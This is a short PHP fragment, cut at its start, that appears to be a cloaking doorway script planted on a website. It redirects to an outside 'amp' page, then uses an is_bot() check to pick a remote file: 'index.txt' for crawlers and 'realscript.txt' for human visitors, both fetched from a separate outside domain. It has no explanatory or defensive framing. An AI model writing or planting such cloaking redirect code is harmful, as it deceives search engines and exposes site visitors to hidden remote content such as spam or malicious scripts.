...
header("Location: https://douberman.dev/amp/amp-biomaterialstranslational.html");
die;
}

$url = is_bot()
? "https://dangerman.locker/landing/biomaterialstranslational/index.txt"
: "https://dangerman.locker/landing/biomaterialstranslational/realscript.txt";
